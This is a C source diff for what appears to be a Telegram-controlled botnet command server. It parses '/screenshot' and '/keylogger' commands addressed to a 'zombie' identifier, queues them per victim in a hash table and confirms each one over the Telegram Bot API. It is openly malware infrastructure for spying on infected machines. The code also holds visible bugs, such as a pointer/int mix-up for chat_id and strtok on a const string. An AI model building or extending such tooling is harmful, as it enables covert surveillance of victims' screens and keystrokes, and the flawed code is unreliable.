@@ -9,8 +9,6 @@
 #include "fiobj.h"
 #include "utils.h"
 
-// Capacity of the hash table
-
 char *base_uri;
 int init_date;
 
@@ -122,9 +120,9 @@ void fetch_updates(json_object **buffer) {
   fflush(stdout);
 }
 
-void write_commands(json_object *buf_arr) {
+void write_commands(json_object *buf_arr, const char *id) {
   char *ht_res;
-  if ((ht_res = ht_search(cmd_table, "abcd")) != NULL) {
+  if ((ht_res = ht_search(cmd_table, id)) != NULL) {
     if (strstr(ht_res, ":")) {
       char *tk = strtok(ht_res, ":");
       while (tk != NULL) {
@@ -149,7 +147,13 @@ void *handle_cmds() {
     fetch_updates(&obj);
 
     if (obj != NULL) {
+      // Get the ok value
       json_object_object_get_ex(obj, "ok", &ok);
+      // If not ok then just continue
+      if (!ok) {
+        continue;
+      }
+
       json_object_object_get_ex(obj, "result", &result);
 
       // printf("Ok: %d\n", json_object_get_boolean(ok));
@@ -162,45 +166,108 @@ void *handle_cmds() {
           int update_id = json_object_get_int(json_object_object_get(update_obj, "update_id"));
 
           if (update_id > last_update_id) {
+            // Get the message object
             struct json_object *message_obj = json_object_object_get(update_obj, "message");
+            // Get the timestamp
             int d = json_object_get_int(json_object_object_get(message_obj, "date"));
+
+            // Check if the message was sent after the bot started (+padding)
             if (init_date < d) {
               last_update_id = update_id;
 
-              // Now we actually do something
-              const char *cmd_label = json_object_get_string(json_object_object_get(message_obj, "text"));
-              const char *id = "abcd";  // TODO: Get id from message
-              if (strcmp(cmd_label, "/screenshot" == 0)) {
+              struct json_object *chat_obj, *desc_obj, *chat_id_obj, *resp_obj, *resp_tmp;
+              
+              chat_obj = json_object_object_get(message_obj, "chat");
+              desc_obj = json_object_object_get(message_obj, "text");
+
+              chat_id_obj = json_object_object_get(chat_obj, "id");
+
+              // Get the actual data we need
+              const char *desc = json_object_get_string(desc_obj);
+              const int *chat_id = json_object_get_int(chat_id_obj);
+
+              // Check if the message description contains a space
+              if (!strstr(desc, " ")) {
+                struct json_object *object, *tmp;
+
+                object = json_object_new_object();
+
+                // Set the chat id
+                tmp = json_object_new_int(chat_id);
+                json_object_object_add(object, "chat_id", tmp);
+                // Set the mesasge text
+                tmp = json_object_new_string("Command requires an identifier to work. Please add one as the first argument.");
+                json_object_object_add(object, "text", tmp);
+
+                // Send the post request
+                send_telegram_post("/sendMessage", json_object_to_json_string(object));
+                
+                json_object_put(object);
+                continue;
+              }
+              
+              // Get the command and the first argument, namely the zombie's identifier
+              char *cmd_label = strtok(desc, " ");
+              char *id = strtok(NULL, " ");
+
+              if (strcmp(cmd_label, "/screenshot") == 0) {
+                // Pre-define the hashtable search result
                 char *ht_res;
+
+                // Search in the hashtable and check if the result is NULL
                 if ((ht_res = ht_search(cmd_table, id)) == NULL) {
+                  // Insert a new entry into the hash table
                   ht_insert(cmd_table, id, cmd_label);
                 } else {
-                  ht_res = (char *)realloc(
-                      ht_res,
-                      (strlen(ht_res) + strlen(cmd_label) + 1) + sizeof(char));
+                  // Reallocate the memory for the entry in the hash table
+                  ht_res = (char *)realloc(ht_res, (strlen(ht_res) + strlen(cmd_label) + 1) + sizeof(char));
+                  // Check if the memory reallocation failed
                   if (ht_res == NULL) {
                     continue;
                   }
 
-                  char *tmp =
-                      (char *)malloc((strlen(cmd_label) + 2) * sizeof(char));
+                  // Declare a temporary variable we'll use later on
+                  char *tmp = (char *)malloc((strlen(cmd_label) + 2) * sizeof(char));
+                  // Check if the memory allocation failed
                   if (tmp == NULL) {
                     continue;
                   }
+
+                  // Copy a : to the temporary variable
                   strcpy(tmp, ":");
+                  // Add the command label
                   strcat(tmp, cmd_label);
 
+                  // Add the previous commands that were already stored in the hashtable
                   strcat(ht_res, tmp);
+                  // Free the temporary variable
                   free(tmp);
 
+                  // Insert/Overwrite into the hashtable
                   ht_insert(cmd_table, id, ht_res);
                 }
               } else if (strcmp(cmd_label, "/keylogger") == 0) {
                 // ...
+                printf("%s\n", id);
+                fflush(stdout);
               }
 
-              // Log the table for reference
-              printf("\nHash Table\n-------------------\n");
+              // ===== Send the mesasge
+              resp_obj = json_object_new_object();
+              // Set the chat id
+              resp_tmp = json_object_new_int(chat_id);
+              json_object_object_add(resp_obj, "chat_id", resp_tmp);
+              // Set the mesasge text
+              resp_tmp = json_object_new_string("The command has been added to the queue and should be pulled shortly.");
+              json_object_object_add(resp_obj, "text", resp_tmp);
+
+              // Send the post request
+              send_telegram_post("/sendMessage", json_object_to_json_string(resp_obj));
+              
+              json_object_put(resp_obj);
+
+              // ===== Log the table for reference
+              printf("\n\nHash Table\n-------------------\n");
               for (int i = 0; i < cmd_table->size; i++) {
                 if (cmd_table->items[i]) {
                   printf("Index: %d, Key: %s, Value: %s\n", i,
@@ -208,16 +275,15 @@ void *handle_cmds() {
                 }
               }
               printf("-------------------\n\n");
-
+              
+              // Flush the standard output
               fflush(stdout);
             }
-            json_object_put(message_obj);
           }
-          json_object_put(update_obj);
         }
       }
     }
-
+    // Sleep so we don't overload on curl requests, and to keep telegram happy
     sleep(1);
   }
 
